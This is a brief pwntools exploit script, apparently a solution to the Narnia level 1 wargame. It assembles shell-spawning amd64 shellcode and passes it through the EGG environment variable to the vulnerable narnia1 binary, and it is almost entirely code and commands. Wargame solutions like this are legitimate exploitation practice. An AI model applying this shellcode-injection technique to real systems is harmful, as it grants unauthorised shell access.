from pwn import *

context.arch = 'amd64'
context.os   = 'linux'


payload = asm(shellcraft.sh())

p = process('./narnia1')

sys.stdout.buffer.write(payload)

#export EGG=$(python3 exp.py) && ./narnia1 

# export EGG=$(python3 -c "from pwn import *;sys.stdout.buffer.write(asm(shellcraft.sh()))" ) && /narnia/narnia1